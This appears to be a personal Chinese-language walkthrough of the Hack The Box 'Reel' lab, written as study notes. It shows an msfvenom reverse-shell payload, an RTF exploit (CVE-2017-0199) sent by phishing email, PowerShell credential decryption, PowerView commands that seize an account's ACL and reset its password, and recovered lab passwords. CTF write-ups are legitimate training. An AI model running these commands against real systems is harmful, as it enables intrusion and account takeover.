靶机：10.10.10.77

kali：10.10.16.5

[【Hack The Box】windows练习-- Reel_hackthebox reel_人间体佐菲的博客-CSDN博客](https://blog.csdn.net/weixin_65527369/article/details/127828899)

[HTB: Reel | 0xdf hacks stuff](https://0xdf.gitlab.io/2018/11/10/htb-reel.html#privesc-backup_admins---administrator)



```bash
└─# nmap -sT -p- --min-rate 5000  10.10.10.77 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 19:13 EDT
Nmap scan report for 10.10.10.77 (10.10.10.77)
Host is up (0.64s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
25/tcp    open  smtp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
49159/tcp open  unknown
```

```bash
└─# nmap -sU -p- --min-rate 5000  10.10.10.77
```

```bash
└─# nmap -sV -sC -O -p 21,22,25 -oN nmap.txt 10.10.10.77
```



# 21 FTP

匿名登录

```bash
└─# ftp 10.10.10.77
Connected to 10.10.10.77.
220 Microsoft FTP Service
Name (10.10.10.77:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||41000|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||41002|)
150 Opening ASCII mode data connection.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
ftp> prompt
Interactive mode off.
ftp> mget *
```

得到三个文件，依次看看：



readme.txt：

```bash
└─# cat readme.txt                                                                                         
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.       
```

RTF 是 Microsoft 产品（如 Word 和 Office）使用的文本文件格式。 RTF 或富文本格式文件由 Microsoft 于 1987 年开发，用于其产品和跨平台文档交换。 大多数文字处理器都可以读取 RTF。



Windows\ Event\ Forwarding.docx：

```bash
─# exiftool Windows\ Event\ Forwarding.docx 
ExifTool Version Number         : 12.57
File Name                       : Windows Event Forwarding.docx
Directory                       : .
File Size                       : 5.3 kB
File Modification Date/Time     : 2023:09:18 19:20:12-04:00
File Access Date/Time           : 2023:09:18 19:20:11-04:00
File Inode Change Date/Time     : 2023:09:18 19:20:12-04:00
File Permissions                : -rw-r--r--
Warning                         : Format error reading ZIP file
File Type                       : ZIP
File Type Extension             : zip
MIME Type                       : application/zip
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409
Zip Compressed Size             : 385
Zip Uncompressed Size           : 1422
Zip File Name                   : [Content_Types].xml
```

应该得到这条信息，一个邮箱地址，我的 exiftool 没得到

```
Creator                         : nico@megabank.com   <-- email address!!
```



AppLocker.docx：

```
AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
```

类似于可以文档执行一些脚本啥的



# 25 SMTP

```bash
└─# telnet 10.10.10.77 25
Trying 10.10.10.77...
Connected to 10.10.10.77.
Escape character is '^]'.
220 Mail Service ready
HELO 0xdf.com
250 Hello.
MAIL FROM: <0xdf@aol.com>
250 OK
RCPT TO: <0xdf@megabank.com>
550 Unknown user
RCPT TO: <nico@megabank.com>
250 OK
RCPT TO: <nico@reel.htb>
250 OK
RCPT TO: <admin@reel.htb>
250 OK
RCPT TO: <0xdf@reel.htb>
250 OK
RCPT TO: <0xdf@leer.htb>
250 OK
```

任何 `@reel.htb` 都可以接受，也接受 `<nico@megabank.com>`



枚举 smtp 用户名：

首先准备字典

```bash
└─# cat test_user.txt 
reel
administrator
admin
root
reel@htb
reel@htb.local
reel@reel.htb
administrator@htb
admin@htb
root@htb
sadfasdfasdfasdf@htb
nico@megabank.com
0xdf@megabank.com
htb@metabank.com
```

使用工具  [`smtp-enum-users`](http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum)

```bash
└─# smtp-user-enum -M RCPT -U test_user.txt -t 10.10.10.77 -w 10
######## Scan started at Mon Sep 18 19:59:30 2023 #########
10.10.10.77: reel@htb exists
10.10.10.77: reel@reel.htb exists
10.10.10.77: administrator@htb exists
10.10.10.77: root@htb exists
10.10.10.77: reel@htb.local exists
10.10.10.77: admin@htb exists
10.10.10.77: sadfasdfasdfasdf@htb exists
10.10.10.77: nico@megabank.com exists
######## Scan completed at Mon Sep 18 19:59:56 2023 #########
```

找到了一些存在的用户



# RTF Exploit

不知道该怎么办时，根据以上收集的信息，用关键字谷歌，看看是否能找到漏洞利用，这里可以推测与 邮件 有关的漏洞可能性大

```bash
└─# searchsploit rtf Microsoft Word
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Office 2010 - '.RTF' Header Stack Overflow                                                                            | windows/local/17474.txt
Microsoft Office Word - '.RTF' Malicious HTA Execution (Metasploit)                                                             | windows/remote/41934.rb
Microsoft Word - '.RTF' pFragments Stack Buffer Overflow (File Format) (MS10-087) (Metasploit)                                  | windows/local/16686.rb
Microsoft Word - '.RTF' Remote Code Execution                                                                                   | windows/remote/41894.py
Microsoft Word - RTF Object Confusion (MS14-017) (Metasploit)                                                                   | windows/local/32793.rb
Microsoft Word 2007 - RTF Object Confusion (ASLR + DEP Bypass)                                                                  | windows/local/36207.py
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

<img src=".\图片\Snipaste_2023-09-19_08-06-03.png" alt="Snipaste_2023-09-19_08-06-03" style="zoom:67%;" />

得到漏洞编号，CVE-2017-0199，再深入寻找 exp 

[NVD - cve-2017-0199 (nist.gov) ](https://nvd.nist.gov/vuln/detail/cve-2017-0199)           [exp](https://github.com/bhdresh/CVE-2017-0199)

于是漏洞利用

1、生成 木马

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=443 -f hta-psh -o msfv.hta
```

2、转换木马

```
python2 CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.16.5/msfv.hta -t rtf -x 0
```

3、kali 监听

```bash
└─# nc -lvvp 443             
```

4、传输文件

```bash
sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s 10.10.10.77 -v
```



5、得到 shell

```bash
┌──(root💀kali)-[~/Reel]
└─# nc -lvvp 443                                        
listening on [any] 443 ...
connect to [10.10.16.5] from 10.10.10.77 [10.10.10.77] 49257
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
htb\nico

C:\Windows\system32>cd c://users/nico/desktop
cd c://users/nico/desktop

c:\Users\nico\Desktop>type user.txt
type user.txt
2bf5c789a1cadcd827b99914c7fdf17f
```



还可以用 msf 

```
exploit(windows/fileformat/office_word_hta)
```



# Privesc: nico -> tom

桌面上有 `cred.xml`：

```powershell
c:\Users\nico\Desktop>type cred.xml
type cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

有个用户名 Tom，密码是加密的

不知道就谷歌。。。



PowerShell 有一个称为 PSCredential 的对象，它提供了一种存储用户名、密码和凭据的方法。
我可以通过加载文件从文件中获取明文密码 Import-CliXml，然后转储结果

解密：

```
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
```

```powershell
c:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"


UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

得到账号密码

```
Tom:1ts-mag1c!!!
```



SSH  登录

```
ssh tom@10.10.10.77
```

```powershell
tom@REEL C:\Users\tom>whoami                                                                                                    
htb\tom   
```



# Tom 用户

二次信息搜集

```powershell
tom@REEL C:\Users\tom>ipconfig /all                                                                                             

Windows IP Configuration                                                                                                        

   Host Name . . . . . . . . . . . . : REEL                                                                                     
   Primary Dns Suffix  . . . . . . . : HTB.LOCAL                                                                                
   Node Type . . . . . . . . . . . . : Hybrid                                                                                   
   IP Routing Enabled. . . . . . . . : No                                                                                       
   WINS Proxy Enabled. . . . . . . . : No                                                                                       
   DNS Suffix Search List. . . . . . : HTB.LOCAL                                                                                
                                       htb             
```

```powershell
tom@REEL C:\Users\tom>hostname                                                                                                  
REEL  
```

得到域 `htb.local`



```powershell
tom@REEL C:\Users\tom\Desktop\AD Audit>dir                                                                                      
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CEBA-B613                                                                                              

 Directory of C:\Users\tom\Desktop\AD Audit                                                                                     

05/29/2018  09:02 PM    <DIR>          .                                                                                        
05/29/2018  09:02 PM    <DIR>          ..                                                                                       
05/30/2018  12:44 AM    <DIR>          BloodHound                                                                               
05/29/2018  09:02 PM               182 note.txt                                                                                 
               1 File(s)            182 bytes                                                                                   
               3 Dir(s)   4,947,132,416 bytes free                                                                              

tom@REEL C:\Users\tom\Desktop\AD Audit>type note.txt                                                                            
Findings:                                                                                                                       

Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                                  

Maybe we should re-run Cypher query against other groups we've created.             
```

桌面还有 BloodHound ，notes.txt 里的意思是让我们找最短路径到 域控



SharpHound.exe 运行失败啊

```
powershell -c "wget -Uri http://10.10.16.5/SharpHound.exe -OutFile ./SharpHound.exe"
```

```
powershell -c "move SharpHound.exe C:\Users\tom\Desktop\'AD Audit'\BloodHound\SharpHound.exe"
```

```
cd "C:\Users\tom\Desktop\AD Audit\BloodHound\"
```



试试 SharpHound.ps1

```
powershell -c "wget -Uri http://10.10.16.5/SharpHound.ps1 -OutFile ./SharpHound.ps1"
```

```
certutil.exe -urlcache -split -f http://10.10.16.5/SharpHound.ps1 C:\Users\tom\desktop\SharpHound.ps1
```

```
powershell -exec bypass -command "Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all" 
```

```
Invoke-BloodHound -CollectAll
```



都失败，报错

```
PS C:\Users\tom\Desktop\AD Audit\BloodHound> ./SharpHound.exe                                                                   
Program 'SharpHound.exe' failed to run: This program is blocked by group policy. For more information, contact your system      
administratorAt line:1 char:1                                                                                                   
+ ./SharpHound.exe                                                                                                              
+ ~~~~~~~~~~~~~~~~.                                                                                                             
At line:1 char:1                                                                                                                
+ ./SharpHound.exe                                                                                                              
+ ~~~~~~~~~~~~~~~~                                                                                                              
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException                                           
    + FullyQualifiedErrorId : NativeCommandFailed         
```



# Privesc: tom -> claire

假装之前用了 bloodhound



将对象所有者更改为攻击者控制的用户接管对象

```
首先我们成为了 Claire 的 ACL 的所有者
然后我们获得重置密码权限
并使用该权限进行更改。
```



```
Import-Module .\PowerView.ps1 
接下来，我将 tom 设置为 claire 的 ACL 的所有者： 
Set-DomainObjectOwner -identity claire -OwnerIdentity tom 
接下来，我将授予 tom 更改该 ACL 上的密码的权限： 
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword 
现在，我将创建一个凭证，然后设置克莱尔的密码： 
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force   
并启用密码
Set-DomainUserPassword -identity claire -accountpassword $SecPassword
```



Now I can use that password to ssh in as claire:

```
ssh claire@10.10.10.77
```

我失败了



# WriteDacl

net group backup_admins
看到该组唯一成员是ranj

现在添加claire
net group backup_admins claire /add

尽管它显示克莱尔现在在组中，但我必须注销并重新登录才能使其生效。
紧接着我继续登陆claire
遍历，浏览

```
claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>dir                                                                   
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CC8A-33E1                                                                                              

 Directory of C:\Users\Administrator\Desktop\Backup Scripts                                                                     

11/02/2017  10:47 PM    <DIR>          .                                                                                        
11/02/2017  10:47 PM    <DIR>          ..                                                                                       
11/04/2017  12:22 AM               845 backup.ps1                                                                               
11/02/2017  10:37 PM               462 backup1.ps1                                                                              
11/04/2017  12:21 AM             5,642 BackupScript.ps1                                                                         
11/02/2017  10:43 PM             2,791 BackupScript.zip                                                                         
11/04/2017  12:22 AM             1,855 folders-system-state.txt                                                                 
11/04/2017  12:22 AM               308 test2.ps1.txt                                                                            
               6 File(s)         11,903 bytes                                                                                   
               2 Dir(s)  15,761,108,992 bytes free                                                                              
```

每个都打开看一看，发现BackupScript.ps1 里面有管理员账户密码

$password=“Cr4ckMeIfYouC4n!”





# 结尾

这里重点复习，尝试对着 谢公子的书看看，powerview 操作 ACL 

对着开头两个链接看看




